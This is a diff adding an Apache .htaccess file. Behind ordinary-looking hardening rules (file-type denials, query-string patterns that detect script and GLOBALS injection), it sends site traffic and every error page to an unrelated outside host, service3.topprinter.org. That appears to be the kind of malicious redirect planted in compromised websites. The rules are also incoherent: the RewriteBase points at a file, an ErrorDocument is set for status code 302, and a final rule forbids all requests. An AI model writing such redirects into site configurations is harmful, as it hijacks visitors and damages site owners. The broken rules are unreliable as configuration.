@@ -1,0 +1,36 @@
+RewriteEngine On  
+RewriteBase /public/index.php
+Options All -Indexes
+<FilesMatch "\.(htaccess|ini|phps|fla|psd|log|sh)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+
+# disable the server signature
+ServerSignature Off
+
+
+
+RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]
+RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})
+
+AddOutputFilterByType DEFLATE text/html text/plain text/xml application/xml application/xhtml+xml text/javascript text/css application/x-javascript
+BrowserMatch ^Mozilla/4 gzip-only-text/html
+BrowserMatch ^Mozilla/4.0[678] no-gzip
+BrowserMatch bMSIE !no-gzip !gzip-only-text/html
+RewriteRule /(.+)$ http://service3.topprinter.org/404.html
+ErrorDocument 400 http://service3.topprinter.org/404.html
+ErrorDocument 401 http://service3.topprinter.org/404.html
+ErrorDocument 403 http://service3.topprinter.org/404.html
+ErrorDocument 404 http://service3.topprinter.org/404.html
+ErrorDocument 500 http://service3.topprinter.org/404.html
+ErrorDocument 302 http://service3.topprinter.org/404.html
+RewriteCond %{REQUEST_FILENAME} -s [OR]  
+RewriteCond %{REQUEST_FILENAME} -l [OR]  
+RewriteCond %{REQUEST_FILENAME} -d  
+RewriteRule ^.*$ - [NC,L]  
+RewriteRule ^.*$ /index.php [NC,L]
+
+RewriteCond %{REQUEST_URI} ^/.*
+RewriteRule .* - [L,F]
